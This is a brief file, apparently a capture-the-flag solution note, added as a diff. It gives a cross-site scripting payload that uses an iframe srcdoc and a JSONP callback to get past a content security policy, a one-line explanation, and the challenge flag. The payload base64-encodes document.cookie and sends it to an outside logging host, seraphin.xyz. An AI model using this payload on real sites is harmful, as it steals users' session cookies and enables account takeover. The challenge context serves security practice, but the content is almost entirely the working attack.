@@ -1,0 +1,5 @@
+input:  <iframe srcdoc="<script src=&quot;/api/jsonp?callback=window.open('https://seraphin.xyz/log%3F'%2Bbtoa(document.cookie), '_parent')//\&quot;></script>"></iframe>
+
+jsonp bypass, iframe to trigger script tag
+
+CHTB{CSP_4nd_Js0np_d0_n0t_alw4ys_g3t_al0ng}
